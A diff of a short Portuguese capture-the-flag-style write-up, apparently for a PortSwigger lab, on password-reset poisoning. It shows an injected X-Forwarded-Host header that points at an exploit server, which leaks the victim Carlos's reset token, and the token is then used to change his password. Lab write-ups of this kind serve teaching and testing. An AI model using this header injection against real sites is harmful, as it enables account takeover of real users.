@@ -12,7 +12,7 @@ falta de sanitização/validação de input no backend.
 1. Pedi o reset de senha para o user Carlos interceptando com o burp
 2. Joguei a request no repeater e adicionei um header manipulado para meu dominio VPS nesse caso o exploit pré configurado do portswigger.
    Header adicionado 
-   ``X-Forwarded-Host: exploit-0a04002303f90c0c808a02ac018600bf.exploit-server.net``
+   ``X-Forwarded-Host: exploit-0a6b00a1044bac9a81788873015b0007.exploit-server.net``
 3. Após isso foi só olhar em Logs do VPS server e encontrar o link com o token
 4. copiei o get inteiro ``/forgot-password?temp-forgot-password-token=jhxdynkkovw7btoa0zh5eejacvyxwhpm`` e colei na url do alvo diretamente
 5. Após cair direto na pagina de reset de senha, mudei a senha de carlos e fiz login
